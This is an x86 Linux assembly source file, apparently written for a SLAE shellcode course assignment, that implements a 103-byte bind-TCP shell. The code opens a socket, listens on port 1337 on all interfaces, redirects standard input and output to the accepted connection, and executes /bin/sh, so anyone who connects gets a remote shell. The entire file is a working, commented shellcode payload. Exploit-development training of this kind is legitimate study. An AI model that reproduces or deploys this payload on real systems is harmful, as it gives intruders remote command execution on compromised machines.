; Shell Bind TCP (103 bytes) Assembly
; Paw Petersen, SLAE-656
; https://www.pawpetersen.dk/slae-assignment-1-shell-bind-tcp-linux-x86/

global _start
section text
_start:  
  ; sockfd = socket(AF_INET , SOCK_STREAM , IPPROTO_IP);
  xor   eax,eax
  push  eax         ; push IPPROTO_IP = 0 
  mov   al,0x66     ; sys_socket
  push  0x1         ; SOCK_STREAM
  mov   ebx,[esp]   ; socketcall type 1
  push  0x2         ; AF_INET
  mov   ecx,esp     ; save pointer to args in ecx
  int   0x80
  mov   esi,eax     ; store socket fd in esi

  ; struct
  ; sockaddr.sin_addr.s_addr = INADDR_ANY;
  ; sockaddr.sin_port = htons( 1337 );
  ; sockaddr.sin_family = AF_INET;
  xor   edx,edx
  push  edx         ; push IN_ADDR_ANY = 0
  push  word 0x3905 ; 1337 in network order
  push  word 0x2    ; push AF_INET = 2 
  mov   ecx,esp     ; save pointer in ecx

  ; bind(sockfd,(struct sockaddr *)&server , sizeof(server));  
  mov   al,0x66     ; sys_socket
  mov   bl,0x2      ; bind
  push  0x10        ; push size of sockaddr struct
  push  ecx         ; push struct pointer
  push  esi         ; push sockfd
  mov   ecx,esp     ; save pointer to args in ecx
  int   0x80

  ; listen(sockfd , 0);
  push  eax         ; push backlog = 0
  mov   al,0x66     ; sys_socket
  mov   bl,0x4      ; listen
  push  esi         ; push sockfd
  mov   ecx,esp     ; save pointer in ecx
  int   0x80

  ; client_sock = accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
  xor   eax,eax
  push  eax         ; *addrlen = NULL
  push  eax         ; *addr = NULL
  mov   al,0x66     ; sys_socket
  push  0x5
  pop   ebx         ; accept
  push  esi         ; sockfd
  mov   ecx,esp     ; save pointer
  int   0x80
  
  ; dup2( client_sock, 2 );
  ; dup2( client_sock, 1 );
  ; dup2( client_sock, 0 );
  mov   ebx,eax     ; save client sockfd in ebx
  xor   ecx,ecx     ; save client sockfd in ebx
  mov   cl,3        ; loop 3 times
dup_loop:
  dec   cl
  mov   al,0x3f     ; dup2
  int   0x80
  jnz   dup_loop

  ; execve("//bin/sh",["//bin/sh"])
  mov   al,0xb      ; execve
  xor   edx,edx
  push  edx         ; push null
  push  0x68732f6e  ; hs/n
  push  0x69622f2f  ; ib//
  mov   ebx,esp     ; save pointer
  push  edx         ; null
  push  ebx         ; push pointer
  mov   ecx,esp     ; save pointer
  int   0x80
